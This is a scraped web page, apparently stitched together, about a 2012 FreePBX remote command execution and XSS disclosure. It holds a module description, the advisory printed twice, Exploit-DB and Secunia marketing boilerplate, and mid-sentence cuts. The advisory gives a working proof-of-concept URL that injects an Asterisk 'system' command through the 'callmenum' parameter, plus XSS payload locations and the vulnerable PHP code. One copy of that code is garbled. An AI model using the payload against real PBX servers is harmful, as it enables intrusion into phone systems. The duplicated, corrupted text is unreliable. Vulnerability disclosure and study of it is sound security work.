				This module exploits FreePBX version 2.10.0,2.9.0 and possibly older.
				Due to the way callme_page.php handles the 'callmenum' parameter, it
				is possible to inject code to the '$channel' variable in function
				callme_startcall in order to gain remote code execution.

				Please note in order to use this module properly, you must know the
				extension number, which can be enumerated or bruteforced, or you may
				try some of the default extensions such as 0 or 200.  Also, the call
				has to be answered (or go to voice).

				Tested on both Elastix and FreePBX ISO image installs.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

```
Product: FreePBX
Version: 2.10.0, 2.9.0 and perhaps earlier versions
Type: Remote Command Execution, XSS
Release Date: March 14, 2012
Vendor Notification Date: Jun 12, 2011
Author: Martin Tschirsich

Overview:

A remote command execution vulnerability and some XSS in current and earlier
FreePBX versions due to missing input sanitization.
FreePBX is a popular implementation (500,000 active phone systems) of
Asterisk (telephony software) based around a web-based configuration
interface and other tools. Some of these installations are on a public IP
address.

Proof of Concept:

RCE:
[HOST]/recordings/misc/callme_page.php?action=c&callmenum=[PHONENUMBER]@from
-internal/n%0D%0AApplication:%20system%0D%0AData:%20[CMD]%0D%0A%0D%0A

XSS (2.9.0 and perhaps other versions):
[HOST]/panel/index_amp.php?context=[XSS]
[HOST]/panel/flash/mypage.php?clid=[XSS]
[HOST]/panel/flash/mypage.php?clidname=[base64_encode(XSS)]
[HOST]/panel/dhtml/index.php?context=/../%00">[XSS]
[HOST]/admin/views/freepbx_reload.php/"</script>[XSS]
[HOST]/recordings/index.php?login='>[XSS]

Details (RCE):

Missing input sanitization in htdocs/recordings/misc/callme_page.php:
// line 28-30:
$to         = $_REQUEST['callmenum']; // vulnerable
$msgFrom    = $_REQUEST['msgFrom'];
$new_path   = substr($path, 0, -4);
// line 38:
$call_status = callme_startcall($to, $msgFrom, $new_path);

Missing input sanitization in htdocs/recordings/includes/callme.php:
// line 88-117:
function callme_startcall($to, $from, $new_path)
{
        global $astman;
        $channel        = "Local/$to@from-internal/n";  // vulnerable
        $context        = "vm-callme";
        $extension      = "s";
        $priority       = "1";
        $callerid       = "VMAIL/$from";
        ...
        /* Arguments to Originate: channel, extension, context, priority,
timeout, callerid, variable, account, application, data */
        $status = $astman->Originate($channel, $extension, $context,
$priority, NULL, $callerid, $variable, NULL, NULL, NULL, NULL);
        ...
}

Unofficial Patch (RCE, tested with 2.9.0):

Patch htdocs/recordings/modules/callme_page.php:
<http://pastebin.com/ZbX50qaZ>
Patch htdocs/recordings/modules/voicemail.module:
<http://pastebin.com/vv3qczfC>

Disclaimer:

The vendor has been contacted and provided with a patch several times since
Jun 12, 2011. Since no intention to address this issue was shown, I felt it
was in the best interest to disclose the vulnerability.

All information in this advisory is provided on an 'as is' basis in the hope

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

**Vulnerable App:**

```
Product: FreePBX
Version: 2.10.0, 2.9.0 and perhaps earlier versions
Type: Remote Command Execution, XSS
Release Date: March 14, 2012
Vendor Notification Date: Jun 12, 2011
Author: Martin Tschirsich

Overview:

A remote command execution vulnerability and some XSS in current and earlier
FreePBX versions due to missing input sanitization.
FreePBX is a popular implementation (500,000 active phone systems) of
Asterisk (telephony software) based around a web-based configuration
interface and other tools. Some of these installations are on a public IP
address.

Proof of Concept:

RCE:
[HOST]/recordings/misc/callme_page.php?action=c&callmenum=[PHONENUMBER]@from
-internal/n%0D%0AApplication:%20system%0D%0AData:%20[CMD]%0D%0A%0D%0A

XSS (2.9.0 and perhaps other versions):
[HOST]/panel/index_amp.php?context=[XSS]
[HOST]/panel/flash/mypage.php?clid=[XSS]
[HOST]/panel/flash/mypage.php?clidname=[base64_encode(XSS)]
[HOST]/panel/dhtml/index.php?context=/../%00">[XSS]
[HOST]/admin/views/freepbx_reload.php/"</script>[XSS]
[HOST]/recordings/index.php?login='>[XSS]

Details (RCE):

Missing input sanitization in htdocs/recordings/misc/callme_page.php:
// line 28-30:
$to         = $_REQUEST['callmenum']; // vulnerable
$msgFrom    = $_REQUEST['msgFrom'];
$new_path   = substr($path, 0, -4);
// line 38:
$call_status = callme_startcall($to, $msgFrom, $new_path);

Missing input sanitization in htdocs/recordings/includes/callme.php:
// line 88-117:
function callme_startcall($to, $from, $new_path)
{
        global $astman;
        $channel        = "Local/$to () from-internal/n";  // vulnerable
        $context        = "vm-callme";
        $extension      = "s";
        $priority       = "1";
        $callerid       = "VMAIL/$from";
        ...
        /* Arguments to Originate: channel, extension, context, priority,
timeout, callerid, variable, account, application, data */
        $status = $astman->Originate($channel, $extension, $context,
$priority, NULL, $callerid, $variable, NULL, NULL, NULL, NULL);
        ...
}

Unofficial Patch (RCE, tested with 2.9.0):

Patch htdocs/recordings/modules/callme_page.php:
http://pastebin.com/ZbX50qaZ
Patch htdocs/recordings/modules/voicemail.module:
http://pastebin.com/vv3qczfC

Disclaimer:

The vendor has been contacted and provided with a patch several times since
Jun 12, 2011. Since no intention to address this issue was shown, I felt it
was in the best interest to disclose the vulnerability.

All information in this advisory is provided on an 'as is' basis in the hope
that it will be useful. The author not responsible for any risks or

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
